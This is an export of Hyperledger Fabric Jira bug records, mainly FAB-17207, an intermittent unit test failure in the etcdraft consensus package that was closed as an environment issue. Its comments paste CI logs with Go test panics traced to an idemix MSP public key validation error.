[https://dev.azure.com/Hyperledger/0227bd2c-c4f6-478f-be00-ee519f115180/_apis/build/builds/3116/logs/64]",,caod,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"06/Dec/19 3:39 AM;caod;it-nwo-configblock.log.zip;https://jira.hyperledger.org/secure/attachment/18004/it-nwo-configblock.log.zip",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015v7:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Mar/20 5:37 AM;denyeart;No recurrence noted in 2020 so far, please re-open if a recurrence is found.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Intermittent UT failure in consensus/etcdraft,FAB-17207,43611,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Environment Issue,,caod,caod,06/Dec/19 4:09 AM,24/Mar/20 10:46 PM,28/Oct/23 3:09 AM,24/Mar/20 10:46 PM,,,,,,,,,,,,,,fabric-orderer,,,,,,,,,0,ci-flake,,,,,"[https://dev.azure.com/Hyperledger/0227bd2c-c4f6-478f-be00-ee519f115180/_apis/build/builds/3142/logs/108]

 

 ",,caod,dereckluo,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"21/Mar/20 2:02 AM;dereckluo;3-20.txt;https://jira.hyperledger.org/secure/attachment/18178/3-20.txt","06/Dec/19 4:09 AM;caod;ut-consensus-etcdraft.log.zip;https://jira.hyperledger.org/secure/attachment/18005/ut-consensus-etcdraft.log.zip",,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015vf:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,dereckluo,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Mar/20 6:51 AM;sykesm;Again we have a log with multiple failures...

{code}
2019-12-05T18:46:58.7386546Z --- FAIL: TestSetup (0.23s)
2019-12-05T18:46:58.7387319Z     idemixmsp_test.go:62: 
2019-12-05T18:46:58.7387529Z         	Error Trace:	idemixmsp_test.go:62
2019-12-05T18:46:58.7387739Z         	Error:      	Received unexpected error:
2019-12-05T18:46:58.7388006Z         	            	invalid issuer public key: zero knowledge proof in public key invalid
2019-12-05T18:46:58.7388196Z         	            	github.com/hyperledger/fabric/bccsp/idemix/bridge.(*Issuer).NewPublicKeyFromBytes
2019-12-05T18:46:58.7388417Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/bccsp/idemix/bridge/issuer.go:96
2019-12-05T18:46:58.7388841Z         	            	github.com/hyperledger/fabric/bccsp/idemix/handlers.(*IssuerPublicKeyImporter).KeyImport
2019-12-05T18:46:58.7389059Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/bccsp/idemix/handlers/issuer.go:130
2019-12-05T18:46:58.7389265Z         	            	github.com/hyperledger/fabric/bccsp/sw.(*CSP).KeyImport
2019-12-05T18:46:58.7389474Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/bccsp/sw/impl.go:148
2019-12-05T18:46:58.7389857Z         	            	github.com/hyperledger/fabric/msp.(*idemixmsp).Setup
2019-12-05T18:46:58.7390093Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/msp/idemixmsp.go:100
2019-12-05T18:46:58.7390277Z         	            	github.com/hyperledger/fabric/msp.setupWithVersion
2019-12-05T18:46:58.7390737Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/msp/idemixmsp_test.go:34
2019-12-05T18:46:58.7390954Z         	            	github.com/hyperledger/fabric/msp.setup
2019-12-05T18:46:58.7391161Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/msp/idemixmsp_test.go:20
2019-12-05T18:46:58.7391548Z         	            	github.com/hyperledger/fabric/msp.TestSetup
2019-12-05T18:46:58.7391781Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/msp/idemixmsp_test.go:61
2019-12-05T18:46:58.7391983Z         	            	testing.tRunner
2019-12-05T18:46:58.7392262Z         	            		/opt/hostedtoolcache/go/1.13.4/x64/src/testing/testing.go:909
2019-12-05T18:46:58.7392601Z         	            	runtime.goexit
2019-12-05T18:46:58.7392814Z         	            		/opt/hostedtoolcache/go/1.13.4/x64/src/runtime/asm_amd64.s:1357
2019-12-05T18:46:58.7393000Z         	            	Failed importing key with opts [&{true [OU Role EnrollmentID RevocationHandle]}]
2019-12-05T18:46:58.7393599Z         	            	github.com/hyperledger/fabric/bccsp/sw.(*CSP).KeyImport
2019-12-05T18:46:58.7393981Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/bccsp/sw/impl.go:150
2019-12-05T18:46:58.7394215Z         	            	github.com/hyperledger/fabric/msp.(*idemixmsp).Setup
2019-12-05T18:46:58.7394394Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/msp/idemixmsp.go:100
2019-12-05T18:46:58.7395157Z         	            	github.com/hyperledger/fabric/msp.setupWithVersion
2019-12-05T18:46:58.7395393Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/msp/idemixmsp_test.go:34
2019-12-05T18:46:58.7395996Z         	            	github.com/hyperledger/fabric/msp.setup
2019-12-05T18:46:58.7396210Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/msp/idemixmsp_test.go:20
2019-12-05T18:46:58.7396410Z         	            	github.com/hyperledger/fabric/msp.TestSetup
2019-12-05T18:46:58.7396689Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/msp/idemixmsp_test.go:61
2019-12-05T18:46:58.7397019Z         	            	testing.tRunner
2019-12-05T18:46:58.7397231Z         	            		/opt/hostedtoolcache/go/1.13.4/x64/src/testing/testing.go:909
2019-12-05T18:46:58.7397406Z         	            	runtime.goexit
2019-12-05T18:46:58.7397695Z         	            		/opt/hostedtoolcache/go/1.13.4/x64/src/runtime/asm_amd64.s:1357
2019-12-05T18:46:58.7398031Z         	            	cannot setup idemix msp with invalid public key
2019-12-05T18:46:58.7398255Z         	            	Setting up MSP failed
2019-12-05T18:46:58.7398448Z         	            	github.com/hyperledger/fabric/msp.setupWithVersion
2019-12-05T18:46:58.7415464Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/msp/idemixmsp_test.go:36
2019-12-05T18:46:58.7415819Z         	            	github.com/hyperledger/fabric/msp.setup
2019-12-05T18:46:58.7416244Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/msp/idemixmsp_test.go:20
2019-12-05T18:46:58.7416443Z         	            	github.com/hyperledger/fabric/msp.TestSetup
2019-12-05T18:46:58.7416653Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/msp/idemixmsp_test.go:61
2019-12-05T18:46:58.7416905Z         	            	testing.tRunner
2019-12-05T18:46:58.7417223Z         	            		/opt/hostedtoolcache/go/1.13.4/x64/src/testing/testing.go:909
2019-12-05T18:46:58.7417435Z         	            	runtime.goexit
2019-12-05T18:46:58.7417598Z         	            		/opt/hostedtoolcache/go/1.13.4/x64/src/runtime/asm_amd64.s:1357
2019-12-05T18:46:58.7417866Z         	Test:       	TestSetup
2019-12-05T18:46:58.7418156Z panic: runtime error: invalid memory address or nil pointer dereference [recovered]
2019-12-05T18:46:58.7418346Z 	panic: runtime error: invalid memory address or nil pointer dereference
2019-12-05T18:46:58.7418644Z [signal SIGSEGV: segmentation violation code=0x1 addr=0x48 pc=0xbfdb6f]
2019-12-05T18:46:58.7418979Z 
2019-12-05T18:46:58.7419174Z goroutine 38 [running]:
2019-12-05T18:46:58.7419353Z testing.tRunner.func1(0xc0000cf400)
2019-12-05T18:46:58.7419512Z 	/opt/hostedtoolcache/go/1.13.4/x64/src/testing/testing.go:874 +0x69f
2019-12-05T18:46:58.7419861Z panic(0xcc77c0, 0x13a9b80)
2019-12-05T18:46:58.7420055Z 	/opt/hostedtoolcache/go/1.13.4/x64/src/runtime/panic.go:679 +0x1b2
2019-12-05T18:46:58.7420228Z github.com/hyperledger/fabric/msp.TestSetup(0xc0000cf400)
2019-12-05T18:46:58.7420404Z 	/home/vsts/work/1/go/src/github.com/hyperledger/fabric/msp/idemixmsp_test.go:64 +0xbf
2019-12-05T18:46:58.7420766Z testing.tRunner(0xc0000cf400, 0xd97058)
2019-12-05T18:46:58.7420965Z 	/opt/hostedtoolcache/go/1.13.4/x64/src/testing/testing.go:909 +0x19a
2019-12-05T18:46:58.7421139Z created by testing.(*T).Run
2019-12-05T18:46:58.7421294Z 	/opt/hostedtoolcache/go/1.13.4/x64/src/testing/testing.go:960 +0x652
2019-12-05T18:46:58.7421649Z FAIL	github.com/hyperledger/fabric/msp	0.518s
{code}

{code}
2019-12-05T18:47:13.9100675Z --- FAIL: TestBlockPullerFromConfigBlockFailures (0.22s)
2019-12-05T18:47:13.9100948Z     --- FAIL: TestBlockPullerFromConfigBlockFailures/invalid_TLS_certificate (0.22s)
2019-12-05T18:47:13.9101013Z         replication_test.go:880: 
2019-12-05T18:47:13.9101087Z             	Error Trace:	replication_test.go:880
2019-12-05T18:47:13.9101140Z             	Error:      	Error message not equal:
2019-12-05T18:47:13.9101198Z             	            	expected: ""unable to decode TLS certificate PEM: ////""
2019-12-05T18:47:13.9101795Z             	            	actual  : ""failed extracting bundle from envelope: initializing channelconfig failed: could not create channel Application sub-group config: setting up the MSP manager failed: cannot setup idemix msp with invalid public key: Failed importing key with opts [&{true [OU Role EnrollmentID RevocationHandle]}]: invalid issuer public key: zero knowledge proof in public key invalid""
2019-12-05T18:47:13.9101910Z             	Test:       	TestBlockPullerFromConfigBlockFailures/invalid_TLS_certificate
2019-12-05T18:47:13.9102232Z [34m2019-12-05 18:47:13.619 UTC [test] PullChannel -> INFO 259[0m Pulling channel mychannel
2019-12-05T18:47:13.9102598Z [34m2019-12-05 18:47:13.625 UTC [test] fetchLastBlockSeq -> INFO 25a[0m 127.0.0.1:32959 is at block sequence of 5
2019-12-05T18:47:13.9102998Z [34m2019-12-05 18:47:13.625 UTC [test] HeightsByEndpoints -> INFO 25b[0m Returning the heights of OSNs mapped by endpoints map[127.0.0.1:32959:6]
2019-12-05T18:47:13.9103346Z [34m2019-12-05 18:47:13.626 UTC [test] PullChannel -> INFO 25c[0m Latest block height for channel mychannel is 6
2019-12-05T18:47:13.9103742Z [34m2019-12-05 18:47:13.626 UTC [test] pullChannelBlocks -> INFO 25d[0m Latest height found (6) is equal to our height, skipping pulling channel mychannel
2019-12-05T18:47:13.9103835Z panic: runtime error: invalid memory address or nil pointer dereference [recovered]
2019-12-05T18:47:13.9103907Z 	panic: runtime error: invalid memory address or nil pointer dereference
2019-12-05T18:47:13.9103984Z [signal SIGSEGV: segmentation violation code=0x1 addr=0x0 pc=0xecd8b2]
2019-12-05T18:47:13.9104025Z 
2019-12-05T18:47:13.9104076Z goroutine 1428 [running]:
2019-12-05T18:47:13.9104131Z testing.tRunner.func1(0xc0003c8d00)
2019-12-05T18:47:13.9104205Z 	/opt/hostedtoolcache/go/1.13.4/x64/src/testing/testing.go:874 +0x69f
2019-12-05T18:47:13.9104260Z panic(0x10c6de0, 0x1be11e0)
2019-12-05T18:47:13.9104318Z 	/opt/hostedtoolcache/go/1.13.4/x64/src/runtime/panic.go:679 +0x1b2
2019-12-05T18:47:13.9104400Z github.com/hyperledger/fabric/orderer/common/cluster_test.testBlockPullerFromConfig(0xc0003c8d00, 0xc000047300, 0x1, 0x1, 0x11eaff2, 0x15, 0x1)
2019-12-05T18:47:13.9104479Z 	/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/common/cluster/replication_test.go:961 +0x1122
2019-12-05T18:47:13.9104548Z github.com/hyperledger/fabric/orderer/common/cluster_test.TestBlockPullerFromConfigBlockGreenPath.func1(0xc0003c8d00)
2019-12-05T18:47:13.9104638Z 	/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/common/cluster/replication_test.go:1054 +0xee
2019-12-05T18:47:13.9104698Z testing.tRunner(0xc0003c8d00, 0xc000047310)
2019-12-05T18:47:13.9104758Z 	/opt/hostedtoolcache/go/1.13.4/x64/src/testing/testing.go:909 +0x19a
2019-12-05T18:47:13.9104828Z created by testing.(*T).Run
2019-12-05T18:47:13.9104886Z 	/opt/hostedtoolcache/go/1.13.4/x64/src/testing/testing.go:960 +0x652
2019-12-05T18:47:13.9104946Z FAIL	github.com/hyperledger/fabric/orderer/common/cluster	2.116s
{code}
;;;","19/Mar/20 6:52 AM;sykesm;And another.
{code}
2019-12-05T18:50:36.1880537Z --- FAIL: TestEndpointconfigFromFromSupport (0.21s)
2019-12-05T18:50:36.1880826Z     --- FAIL: TestEndpointconfigFromFromSupport/Last_config_block_is_retrieved_and_is_valid (0.20s)
2019-12-05T18:50:36.1880906Z         blockpuller_test.go:104: 
2019-12-05T18:50:36.1880972Z             	Error Trace:	blockpuller_test.go:104
2019-12-05T18:50:36.1881027Z             	Error:      	Expected value not to be nil.
2019-12-05T18:50:36.1881105Z             	Test:       	TestEndpointconfigFromFromSupport/Last_config_block_is_retrieved_and_is_valid
2019-12-05T18:50:36.1881162Z         blockpuller_test.go:105: 
2019-12-05T18:50:36.1881216Z             	Error Trace:	blockpuller_test.go:105
2019-12-05T18:50:36.1881286Z             	Error:      	Received unexpected error:
2019-12-05T18:50:36.1881346Z             	            	invalid issuer public key: zero knowledge proof in public key invalid
2019-12-05T18:50:36.1881409Z             	            	github.com/hyperledger/fabric/bccsp/idemix/bridge.(*Issuer).NewPublicKeyFromBytes
2019-12-05T18:50:36.1881501Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/bccsp/idemix/bridge/issuer.go:96
2019-12-05T18:50:36.1881571Z             	            	github.com/hyperledger/fabric/bccsp/idemix/handlers.(*IssuerPublicKeyImporter).KeyImport
2019-12-05T18:50:36.1881645Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/bccsp/idemix/handlers/issuer.go:130
2019-12-05T18:50:36.1881727Z             	            	github.com/hyperledger/fabric/bccsp/sw.(*CSP).KeyImport
2019-12-05T18:50:36.1881789Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/bccsp/sw/impl.go:148
2019-12-05T18:50:36.1881852Z             	            	github.com/hyperledger/fabric/msp.(*idemixmsp).Setup
2019-12-05T18:50:36.1881932Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/msp/idemixmsp.go:100
2019-12-05T18:50:36.1881998Z             	            	github.com/hyperledger/fabric/common/channelconfig.(*MSPConfigHandler).ProposeMSP
2019-12-05T18:50:36.1882085Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/msp.go:75
2019-12-05T18:50:36.1882153Z             	            	github.com/hyperledger/fabric/common/channelconfig.(*OrganizationConfig).validateMSP
2019-12-05T18:50:36.1882229Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/organization.go:85
2019-12-05T18:50:36.1882312Z             	            	github.com/hyperledger/fabric/common/channelconfig.(*OrganizationConfig).Validate
2019-12-05T18:50:36.1882381Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/organization.go:78
2019-12-05T18:50:36.1882450Z             	            	github.com/hyperledger/fabric/common/channelconfig.(*ApplicationOrgConfig).Validate
2019-12-05T18:50:36.1882537Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/applicationorg.go:71
2019-12-05T18:50:36.1883031Z             	            	github.com/hyperledger/fabric/common/channelconfig.NewApplicationOrgConfig
2019-12-05T18:50:36.1883106Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/applicationorg.go:57
2019-12-05T18:50:36.1883278Z             	            	github.com/hyperledger/fabric/common/channelconfig.NewApplicationConfig
2019-12-05T18:50:36.1883348Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/application.go:55
2019-12-05T18:50:36.1883417Z             	            	github.com/hyperledger/fabric/common/channelconfig.NewChannelConfig
2019-12-05T18:50:36.1883502Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/channel.go:101
2019-12-05T18:50:36.1883569Z             	            	github.com/hyperledger/fabric/common/channelconfig.NewBundle
2019-12-05T18:50:36.1883656Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/bundle.go:187
2019-12-05T18:50:36.1883731Z             	            	github.com/hyperledger/fabric/common/channelconfig.NewBundleFromEnvelope
2019-12-05T18:50:36.1883798Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/bundle.go:178
2019-12-05T18:50:36.1883893Z             	            	github.com/hyperledger/fabric/orderer/common/cluster.EndpointconfigFromConfigBlock
2019-12-05T18:50:36.1883963Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/common/cluster/util.go:413
2019-12-05T18:50:36.1884030Z             	            	github.com/hyperledger/fabric/orderer/consensus/etcdraft.EndpointconfigFromSupport
2019-12-05T18:50:36.1884114Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/blockpuller.go:42
2019-12-05T18:50:36.1884184Z             	            	github.com/hyperledger/fabric/orderer/consensus/etcdraft_test.TestEndpointconfigFromFromSupport.func1
2019-12-05T18:50:36.1884263Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/blockpuller_test.go:102
2019-12-05T18:50:36.1884349Z             	            	testing.tRunner
2019-12-05T18:50:36.1884410Z             	            		/opt/hostedtoolcache/go/1.13.4/x64/src/testing/testing.go:909
2019-12-05T18:50:36.1884467Z             	            	runtime.goexit
2019-12-05T18:50:36.1884544Z             	            		/opt/hostedtoolcache/go/1.13.4/x64/src/runtime/asm_amd64.s:1357
2019-12-05T18:50:36.1884610Z             	            	Failed importing key with opts [&{true [OU Role EnrollmentID RevocationHandle]}]
2019-12-05T18:50:36.1884691Z             	            	github.com/hyperledger/fabric/bccsp/sw.(*CSP).KeyImport
2019-12-05T18:50:36.1884756Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/bccsp/sw/impl.go:150
2019-12-05T18:50:36.1884828Z             	            	github.com/hyperledger/fabric/msp.(*idemixmsp).Setup
2019-12-05T18:50:36.1884909Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/msp/idemixmsp.go:100
2019-12-05T18:50:36.1884976Z             	            	github.com/hyperledger/fabric/common/channelconfig.(*MSPConfigHandler).ProposeMSP
2019-12-05T18:50:36.1885051Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/msp.go:75
2019-12-05T18:50:36.1885134Z             	            	github.com/hyperledger/fabric/common/channelconfig.(*OrganizationConfig).validateMSP
2019-12-05T18:50:36.1885204Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/organization.go:85
2019-12-05T18:50:36.1885273Z             	            	github.com/hyperledger/fabric/common/channelconfig.(*OrganizationConfig).Validate
2019-12-05T18:50:36.1885358Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/organization.go:78
2019-12-05T18:50:36.1885498Z             	            	github.com/hyperledger/fabric/common/channelconfig.(*ApplicationOrgConfig).Validate
2019-12-05T18:50:36.1885568Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/applicationorg.go:71
2019-12-05T18:50:36.1885711Z             	            	github.com/hyperledger/fabric/common/channelconfig.NewApplicationOrgConfig
2019-12-05T18:50:36.1885779Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/applicationorg.go:57
2019-12-05T18:50:36.1885865Z             	            	github.com/hyperledger/fabric/common/channelconfig.NewApplicationConfig
2019-12-05T18:50:36.1885934Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/application.go:55
2019-12-05T18:50:36.1886002Z             	            	github.com/hyperledger/fabric/common/channelconfig.NewChannelConfig
2019-12-05T18:50:36.1886098Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/channel.go:101
2019-12-05T18:50:36.1886164Z             	            	github.com/hyperledger/fabric/common/channelconfig.NewBundle
2019-12-05T18:50:36.1886240Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/bundle.go:187
2019-12-05T18:50:36.1886322Z             	            	github.com/hyperledger/fabric/common/channelconfig.NewBundleFromEnvelope
2019-12-05T18:50:36.1886389Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/bundle.go:178
2019-12-05T18:50:36.1886457Z             	            	github.com/hyperledger/fabric/orderer/common/cluster.EndpointconfigFromConfigBlock
2019-12-05T18:50:36.1886543Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/common/cluster/util.go:413
2019-12-05T18:50:36.1886610Z             	            	github.com/hyperledger/fabric/orderer/consensus/etcdraft.EndpointconfigFromSupport
2019-12-05T18:50:36.1886689Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/blockpuller.go:42
2019-12-05T18:50:36.1886786Z             	            	github.com/hyperledger/fabric/orderer/consensus/etcdraft_test.TestEndpointconfigFromFromSupport.func1
2019-12-05T18:50:36.1886856Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/blockpuller_test.go:102
2019-12-05T18:50:36.1886936Z             	            	testing.tRunner
2019-12-05T18:50:36.1886997Z             	            		/opt/hostedtoolcache/go/1.13.4/x64/src/testing/testing.go:909
2019-12-05T18:50:36.1887056Z             	            	runtime.goexit
2019-12-05T18:50:36.1887133Z             	            		/opt/hostedtoolcache/go/1.13.4/x64/src/runtime/asm_amd64.s:1357
2019-12-05T18:50:36.1887196Z             	            	cannot setup idemix msp with invalid public key
2019-12-05T18:50:36.1887262Z             	            	setting up the MSP manager failed
2019-12-05T18:50:36.1887678Z             	            	could not create channel Application sub-group config
2019-12-05T18:50:36.1887752Z             	            	github.com/hyperledger/fabric/common/channelconfig.NewChannelConfig
2019-12-05T18:50:36.1892260Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/channel.go:110
2019-12-05T18:50:36.1892386Z             	            	github.com/hyperledger/fabric/common/channelconfig.NewBundle
2019-12-05T18:50:36.1892454Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/bundle.go:187
2019-12-05T18:50:36.1892519Z             	            	github.com/hyperledger/fabric/common/channelconfig.NewBundleFromEnvelope
2019-12-05T18:50:36.1892605Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/bundle.go:178
2019-12-05T18:50:36.1893069Z             	            	github.com/hyperledger/fabric/orderer/common/cluster.EndpointconfigFromConfigBlock
2019-12-05T18:50:36.1893141Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/common/cluster/util.go:413
2019-12-05T18:50:36.1893297Z             	            	github.com/hyperledger/fabric/orderer/consensus/etcdraft.EndpointconfigFromSupport
2019-12-05T18:50:36.1893366Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/blockpuller.go:42
2019-12-05T18:50:36.1893436Z             	            	github.com/hyperledger/fabric/orderer/consensus/etcdraft_test.TestEndpointconfigFromFromSupport.func1
2019-12-05T18:50:36.1893523Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/blockpuller_test.go:102
2019-12-05T18:50:36.1893584Z             	            	testing.tRunner
2019-12-05T18:50:36.1893659Z             	            		/opt/hostedtoolcache/go/1.13.4/x64/src/testing/testing.go:909
2019-12-05T18:50:36.1893724Z             	            	runtime.goexit
2019-12-05T18:50:36.1893783Z             	            		/opt/hostedtoolcache/go/1.13.4/x64/src/runtime/asm_amd64.s:1357
2019-12-05T18:50:36.1893865Z             	            	initializing channelconfig failed
2019-12-05T18:50:36.1893925Z             	            	github.com/hyperledger/fabric/common/channelconfig.NewBundle
2019-12-05T18:50:36.1893989Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/bundle.go:189
2019-12-05T18:50:36.1894073Z             	            	github.com/hyperledger/fabric/common/channelconfig.NewBundleFromEnvelope
2019-12-05T18:50:36.1894139Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/bundle.go:178
2019-12-05T18:50:36.1894204Z             	            	github.com/hyperledger/fabric/orderer/common/cluster.EndpointconfigFromConfigBlock
2019-12-05T18:50:36.1894294Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/common/cluster/util.go:413
2019-12-05T18:50:36.1894359Z             	            	github.com/hyperledger/fabric/orderer/consensus/etcdraft.EndpointconfigFromSupport
2019-12-05T18:50:36.1894434Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/blockpuller.go:42
2019-12-05T18:50:36.1894519Z             	            	github.com/hyperledger/fabric/orderer/consensus/etcdraft_test.TestEndpointconfigFromFromSupport.func1
2019-12-05T18:50:36.1894589Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/blockpuller_test.go:102
2019-12-05T18:50:36.1894649Z             	            	testing.tRunner
2019-12-05T18:50:36.1894723Z             	            		/opt/hostedtoolcache/go/1.13.4/x64/src/testing/testing.go:909
2019-12-05T18:50:36.1894983Z             	            	runtime.goexit
2019-12-05T18:50:36.1895058Z             	            		/opt/hostedtoolcache/go/1.13.4/x64/src/runtime/asm_amd64.s:1357
2019-12-05T18:50:36.1895134Z             	            	failed extracting bundle from envelope
2019-12-05T18:50:36.1895194Z             	            	github.com/hyperledger/fabric/orderer/common/cluster.EndpointconfigFromConfigBlock
2019-12-05T18:50:36.1895268Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/common/cluster/util.go:415
2019-12-05T18:50:36.1895348Z             	            	github.com/hyperledger/fabric/orderer/consensus/etcdraft.EndpointconfigFromSupport
2019-12-05T18:50:36.1895416Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/blockpuller.go:42
2019-12-05T18:50:36.1895503Z             	            	github.com/hyperledger/fabric/orderer/consensus/etcdraft_test.TestEndpointconfigFromFromSupport.func1
2019-12-05T18:50:36.1895575Z             	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/blockpuller_test.go:102
2019-12-05T18:50:36.1895736Z             	            	testing.tRunner
2019-12-05T18:50:36.1895812Z             	            		/opt/hostedtoolcache/go/1.13.4/x64/src/testing/testing.go:909
2019-12-05T18:50:36.1895934Z             	            	runtime.goexit
2019-12-05T18:50:36.1895992Z             	            		/opt/hostedtoolcache/go/1.13.4/x64/src/runtime/asm_amd64.s:1357
2019-12-05T18:50:36.1896073Z             	Test:       	TestEndpointconfigFromFromSupport/Last_config_block_is_retrieved_and_is_valid
{code};;;","19/Mar/20 6:52 AM;sykesm;And another
{code}
2019-12-05T18:50:36.1896449Z --- FAIL: TestNewBlockPuller (0.42s)
2019-12-05T18:50:36.1896510Z     blockpuller_test.go:152: 
2019-12-05T18:50:36.1896581Z         	Error Trace:	blockpuller_test.go:152
2019-12-05T18:50:36.1896636Z         	Error:      	Received unexpected error:
2019-12-05T18:50:36.1896696Z         	            	invalid issuer public key: zero knowledge proof in public key invalid
2019-12-05T18:50:36.1896775Z         	            	github.com/hyperledger/fabric/bccsp/idemix/bridge.(*Issuer).NewPublicKeyFromBytes
2019-12-05T18:50:36.1896851Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/bccsp/idemix/bridge/issuer.go:96
2019-12-05T18:50:36.1896918Z         	            	github.com/hyperledger/fabric/bccsp/idemix/handlers.(*IssuerPublicKeyImporter).KeyImport
2019-12-05T18:50:36.1897006Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/bccsp/idemix/handlers/issuer.go:130
2019-12-05T18:50:36.1897069Z         	            	github.com/hyperledger/fabric/bccsp/sw.(*CSP).KeyImport
2019-12-05T18:50:36.1897130Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/bccsp/sw/impl.go:148
2019-12-05T18:50:36.1897207Z         	            	github.com/hyperledger/fabric/msp.(*idemixmsp).Setup
2019-12-05T18:50:36.1897269Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/msp/idemixmsp.go:100
2019-12-05T18:50:36.1897333Z         	            	github.com/hyperledger/fabric/common/channelconfig.(*MSPConfigHandler).ProposeMSP
2019-12-05T18:50:36.1897422Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/msp.go:75
2019-12-05T18:50:36.1897489Z         	            	github.com/hyperledger/fabric/common/channelconfig.(*OrganizationConfig).validateMSP
2019-12-05T18:50:36.1897562Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/organization.go:85
2019-12-05T18:50:36.1897644Z         	            	github.com/hyperledger/fabric/common/channelconfig.(*OrganizationConfig).Validate
